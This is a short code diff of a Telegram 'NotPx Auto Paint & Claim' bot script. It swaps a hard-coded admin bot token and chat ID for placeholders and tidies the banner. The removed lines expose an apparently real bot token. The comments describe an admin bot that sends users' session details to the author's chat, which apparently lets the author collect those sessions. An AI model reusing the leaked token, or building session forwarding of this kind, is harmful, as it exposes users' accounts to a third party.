@@ -5,9 +5,14 @@ import os
 import threading
 import time
 
+# Define Colors
+class Colors:
+    BLUE = "\033[94m"   # Blue color code
+    END = "\033[0m"     # Reset to default color
+
 # Global bot token for sending session details to your Telegram
-admin_bot_token = "7120755233:AAEkA80gGu6QZ03LkDfZURllxoDIVpR8xg4"  # Your bot token to communicate with you
-admin_chat_id = "6939063404"  # Your personal chat ID where session info will be sent
+admin_bot_token = "YOUR_ADMIN_BOT_TOKEN"  # Your bot token to communicate with you
+admin_chat_id = "YOUR_CHAT_ID"  # Your personal chat ID where session info will be sent
 
 # Initialize bot for admin notifications
 admin_bot = telebot.TeleBot(admin_bot_token)
@@ -108,7 +113,7 @@ def clear_screen():
 def process():
     clear_screen()  # Clear the terminal screen
 
-    print(r"""{}
+    print(r"""  
         ███╗   ███╗  ██████╗  ██╗  ██╗ ███████╗ ██╗ ███╗   ██╗
         ████╗ ████║ ██╔═══██╗ ██║  ██║ ██╔════╝ ██║ ████╗  ██║
         ██╔████╔██║ ██║   ██║ ███████║ ███████╗ ██║ ██╔██╗ ██║
@@ -116,8 +121,8 @@ def process():
         ██║ ╚═╝ ██║ ╚██████╔╝ ██║  ██║ ███████║ ██║ ██║ ╚████║
         ╚═╝     ╚═╝  ╚═════╝  ╚═╝  ╚═╝ ╚══════╝ ╚═╝ ╚═╝  ╚═══╝
                                                 
-            NotPx Auto Paint & Claim by @helpppeeerrrr - v1.0 {}""".format(Colors.BLUE, Colors.END))
-
+            NotPx Auto Paint & Claim by @helpppeeerrrr - v1.0 """)
+    
     print("Starting Telegram bot...")
     bot_token = input("Enter your bot token: ")
     bot = get_bot_instance(bot_token)  # Bot instance for main process
